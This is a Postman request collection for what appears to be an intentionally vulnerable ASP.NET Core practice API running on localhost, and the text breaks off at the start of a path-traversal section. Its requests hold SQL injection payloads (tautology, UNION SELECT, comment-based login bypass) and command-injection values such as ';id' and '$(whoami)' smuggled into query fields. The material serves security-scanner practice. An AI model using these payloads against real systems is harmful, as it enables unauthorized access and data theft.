{
  "info": {
    "name": "VulnerableApi - Security Scanning Practice",
    "_postman_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "description": "Intentionally vulnerable ASP.NET Core API. Use only against your local instance. Each request is pre-loaded with a malicious payload that exercises the corresponding CWE.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    { "key": "baseUrl", "value": "http://localhost:5080" }
  ],
  "item": [
    {
      "name": "SQL Injection",
      "item": [
        {
          "name": "GetUser - tautology (CWE-89)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/sqlinjection/user?username=' OR '1'='1",
              "host": ["{{baseUrl}}"],
              "path": ["api", "sqlinjection", "user"],
              "query": [
                { "key": "username", "value": "' OR '1'='1" }
              ]
            },
            "description": "Classic SQL injection - tautology bypass via concatenated WHERE clause."
          }
        },
        {
          "name": "Search - UNION based (CWE-89)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/sqlinjection/search?term=a%' UNION SELECT name, type, id FROM sysobjects --",
              "host": ["{{baseUrl}}"],
              "path": ["api", "sqlinjection", "search"],
              "query": [
                { "key": "term", "value": "a%' UNION SELECT name, type, id FROM sysobjects --" }
              ]
            },
            "description": "String interpolation sink. The endpoint echoes the constructed SQL in the response so you can see the injection regardless of whether a DB is connected."
          }
        },
        {
          "name": "Login - error-based + auth bypass (CWE-89, CWE-209)",
          "request": {
            "method": "POST",
            "header": [
              { "key": "Content-Type", "value": "application/json" }
            ],
            "body": {
              "mode": "raw",
              "raw": "{\n  \"username\": \"admin' --\",\n  \"password\": \"anything\"\n}"
            },
            "url": {
              "raw": "{{baseUrl}}/api/sqlinjection/login",
              "host": ["{{baseUrl}}"],
              "path": ["api", "sqlinjection", "login"]
            },
            "description": "SQL auth bypass with comment terminator. Server also leaks full exception text on errors."
          }
        }
      ]
    },
    {
      "name": "Command Injection",
      "item": [
        {
          "name": "Ping - shell metachar injection (CWE-78)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/commandinjection/ping?host=127.0.0.1;id",
              "host": ["{{baseUrl}}"],
              "path": ["api", "commandinjection", "ping"],
              "query": [
                { "key": "host", "value": "127.0.0.1;id" }
              ]
            },
            "description": "Input is concatenated into '/bin/sh -c'. The ';id' runs after ping."
          }
        },
        {
          "name": "Ping - command substitution (CWE-78)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/commandinjection/ping?host=$(whoami)",
              "host": ["{{baseUrl}}"],
              "path": ["api", "commandinjection", "ping"],
              "query": [
                { "key": "host", "value": "$(whoami)" }
              ]
            }
          }
        },
        {
          "name": "Nslookup - chained command (CWE-78)",
          "request": {
            "method": "GET",
            "header": [],
            "url": {
              "raw": "{{baseUrl}}/api/commandinjection/nslookup?domain=example.com & whoami",
              "host": ["{{baseUrl}}"],
              "path": ["api", "commandinjection", "nslookup"],
              "query": [
                { "key": "domain", "value": "example.com & whoami" }
              ]
            },
            "description": "Windows-style command chain. On Linux this won't actually run cmd.exe, but the sink is still flagged by SAST."
          }
        }
      ]
    },
    {
      "name": "Path Traversal",
      "item": [
